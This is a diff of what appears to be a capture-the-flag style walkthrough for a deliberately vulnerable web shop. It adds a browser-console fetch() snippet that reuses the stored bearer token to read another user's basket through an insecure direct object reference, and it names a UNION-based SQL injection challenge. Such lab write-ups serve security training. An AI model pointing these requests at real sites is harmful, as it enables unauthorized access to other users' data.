@@ -51,12 +51,18 @@ Travel to /metrics
 **4\. Broken Access Control \- View another user’s shopping bucket (direct object reference)**
 
 Go to Your Basket
-
 Open dev tools 
+paste this into the console (change localhost to target url)
 
-Basket id is stored in Storage \-\> Session Storage
+```
+fetch('http://localhost:3000/rest/basket/2', {
+  method: 'GET',
+  headers: {
+    Authorization: `Bearer ${localStorage.token}`,
+  }
+});
 
-Change bid value to say 1
+```
 
 **5\. Injection SQL \- Extract the database schema using a UNION-based SQL injection in search/query parameter**
 
